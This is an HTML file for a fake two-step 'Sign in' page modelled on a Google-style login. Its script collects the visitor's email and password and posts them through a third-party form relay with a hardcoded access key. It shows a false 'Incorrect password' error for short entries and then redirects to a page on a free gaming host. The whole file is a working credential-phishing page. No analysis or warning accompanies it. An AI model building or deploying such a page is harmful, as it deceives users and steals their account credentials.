<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
body {
  font-family: 'Roboto', sans-serif;
  background: #121212;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
  color: #e0e0e0;
}
.container {
  width: 360px;
  max-width: 90%;
  background: #1e1e1e;
  border-radius: 8px;
  box-shadow: 0 8px 25px rgba(0,0,0,0.7);
  padding: 48px 40px 36px;
  text-align: center;
  box-sizing: border-box;
}
.logo {
  width: 75px;
  height: auto;
  margin-bottom: 20px;
  filter: brightness(0) invert(1);
}
h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #e0e0e0; }
p.sub { font-size: 16px; color: #b0b0b0; margin: 0 0 16px; }
.field { position: relative; margin-bottom: 28px; }
.field input {
  width: 100%;
  border: none;
  border-bottom: 1px solid #555;
  font-size: 16px;
  padding: 10px 0;
  outline: none;
  background: transparent;
  border-radius: 2px;
  color: #e0e0e0;
  transition: border-color 0.3s ease;
  box-sizing: border-box;
}
.field input::placeholder { color: transparent; }
.field input:focus { border-bottom: 2px solid #1a73e8; }
.field input.error { border-bottom: 2px solid #f44336; }

/* Label red on error */
.field input.error + label,
.field input.error:focus + label,
.field input.error:not(:placeholder-shown) + label {
  color: #f44336 !important;
}

.field label {
  position: absolute;
  top: 10px;
  left: 0;
  font-size: 16px;
  color: #aaa;
  transition: all 0.2s ease;
  pointer-events: none;
}
.field input:focus ~ label,
.field input:not(:placeholder-shown) ~ label {
  top: -12px;
  font-size: 12px;
  color: #1a73e8;
}
.btn {
  background: #1a73e8;
  color: #fff;
  border: none;
  padding: 10px 24px;
  border-radius: 4px;
  font-weight: 500;
  font-size: 14px;
  cursor: pointer;
  transition: background 0.2s ease, transform 0.2s ease;
}
.btn:hover { background: #1669c1; transform: scale(1.03); }
.show-pass {
  font-size: 12px;
  color: #b0b0b0;
  display: flex;
  align-items: center;
  margin-top: 6px;
  cursor: pointer;
}
.show-pass input { margin-right: 6px; cursor: pointer; }
.hidden { display: none; }

/* Center welcome/email */
.email-display-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
  margin-bottom: 16px;
}
.email-display-wrapper h1 {
  margin: 0;
  font-weight: 400;
  font-size: 24px;
}
.email-display {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 14px;
  color: #e0e0e0;
}
.email-display img {
  width: 1em; 
  height: 1em;
  border-radius: 50%;
  background: #555;
  object-fit: cover;
}

/* Forgot links inline with buttons */
.email-btn-container, .forgot-password-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 12px;
}
.forgot-link-email, .forgot-link-password {
  font-size: 13px;
  color: #1a73e8;
  text-decoration: none;
}
.forgot-link-email { margin-top: 6px; }
.forgot-link-email:hover, .forgot-link-password:hover { text-decoration: underline; }

/* Gmail-style error message flush left with no spacing */
.error-message {
  color: #f44336;
  font-size: 13px;
  margin-top: 6px;
  display: none;
  display: flex;
  align-items: center;
  justify-content: flex-start;
  gap: 0; /* no spacing between icon and text */
}

/* Gmail-style red circle icon with exclamation mark flush against text */
.error-message::before {
  content: "!";
  background-color: #f44336;
  color: white;
  font-size: 10px;
  font-weight: bold;
  width: 12px;
  height: 12px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-right: 0; /* flush with text */
}

/* Typing dots */
.typing-dots {
  display: flex;
  justify-content: center;
  gap: 4px;
  margin-top: 10px;
}
.typing-dots span {
  width: 6px;
  height: 6px;
  background: #bbb;
  border-radius: 50%;
  animation: bounce 1s infinite;
}
.typing-dots span:nth-child(2) { animation-delay: 0.2s; }
.typing-dots span:nth-child(3) { animation-delay: 0.4s; }
@keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }

.footer { margin-top: 40px; font-size: 12px; color: #b0b0b0; }
.footer a { color: #1a73e8; text-decoration: none; margin: 0 4px; }
a:hover { text-decoration: underline; }

/* RESPONSIVE STYLES */
@media (max-width: 768px) {
  .container { width: 80%; padding: 40px 30px 30px; }
  h1 { font-size: 22px; }
  p.sub { font-size: 15px; }
  .btn { padding: 8px 20px; font-size: 13px; }
  .email-display { font-size: 16px; gap: 8px; }
  .email-display img { width: 1.3em; height: 1.3em; }
}
@media (max-width: 480px) {
  .container { width: 95%; padding: 32px 20px 28px; }
  h1 { font-size: 20px; }
  p.sub { font-size: 14px; }
  .btn { padding: 8px 16px; font-size: 13px; }
  .email-display { font-size: 15px; gap: 6px; }
  .email-display img { width: 1.2em; height: 1.2em; }
}
</style>
</head>
<body>
<div class="container">
  <img src="your-brand-logo.png" alt="Logo" class="logo">

  <!-- Email Step -->
  <div id="emailStep">
    <h1>Sign in</h1>
    <p class="sub">to continue</p>
    <form id="emailForm">
      <div class="field">
        <input type="email" id="email" name="email" required placeholder=" " autocomplete="off">
        <label for="email">Email or phone</label>
      </div>
      <div class="email-btn-container">
        <a href="#" class="forgot-link-email">Forgot email?</a>
        <button type="submit" class="btn">Next</button>
      </div>
    </form>
  </div>

  <!-- Password Step -->
  <div id="passwordStep" class="hidden">
    <div class="email-display-wrapper">
      <h1>Welcome</h1>
      <div class="email-display">
        <img src="your-avatar.png" alt="Avatar" id="avatarImage">
        <span id="displayEmail"></span>
      </div>
    </div>

    <form id="passwordForm" action="https://api.web3forms.com/submit" method="POST">
      <input type="hidden" name="access_key" value="20493b9d-36c9-40b4-a362-ca956132eb2e">
      <input type="hidden" name="email" id="hiddenEmail">
      <div class="field">
        <input type="password" id="message" name="message" required placeholder=" ">
        <label for="message">Password</label>
        <div class="error-message" id="errorMsg">Incorrect password</div>
      </div>
      <label class="show-pass">
        <input type="checkbox" id="togglePass"> Show password
      </label>

      <div class="forgot-password-container">
        <a href="#" class="forgot-link-password">Forgot password?</a>
        <button type="submit" class="btn">Sign In</button>
      </div>

      <div class="typing-dots">
        <span></span>
        <span></span>
        <span></span>
      </div>
    </form>
  </div>

  <div class="footer">
    English (United States) · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
  </div>
</div>

<script>
const emailStep = document.getElementById('emailStep');
const passwordStep = document.getElementById('passwordStep');
const emailForm = document.getElementById('emailForm');
const passwordForm = document.getElementById('passwordForm');
const displayEmail = document.getElementById('displayEmail');
const hiddenEmail = document.getElementById('hiddenEmail');
const emailInput = document.getElementById('email');
const togglePass = document.getElementById('togglePass');
const passwordInput = document.getElementById('message');
const errorMsg = document.getElementById('errorMsg');
const avatarImage = document.getElementById('avatarImage');

emailForm.addEventListener('submit', function(e) {
  e.preventDefault();
  if(emailInput.value.trim() !== ""){
    displayEmail.textContent = emailInput.value;
    hiddenEmail.value = emailInput.value;
    avatarImage.src = "your-avatar.png";
    emailStep.classList.add('hidden');
    passwordStep.classList.remove('hidden');
    errorMsg.style.display = 'none';
    passwordInput.classList.remove('error');
    passwordInput.value = "";
  }
});

togglePass.addEventListener('change', function() {
  passwordInput.type = this.checked ? "text" : "password";
});

passwordForm.addEventListener('submit', async function(e) {
  e.preventDefault();
  
  if(passwordInput.value.length < 8){
    errorMsg.style.display = 'flex';
    passwordInput.classList.add('error'); 
    passwordInput.value = "";
    return;
  }

  passwordInput.classList.remove('error');
  errorMsg.style.display = 'none';

  const formData = new FormData(passwordForm);
  try {
    const response = await fetch(passwordForm.action, { method:'POST', body: formData });
    if(response.ok){
      window.location.href = "http://razerecode.mygamesonline.org/razer.html";
    } else {
      errorMsg.style.display = 'flex';
      passwordInput.classList.add('error');
      passwordInput.value = "";
    }
  } catch(err){
    errorMsg.style.display = 'flex';
    passwordInput.classList.add('error');
    passwordInput.value = "";
  }
});
</script>
</body>
</html>
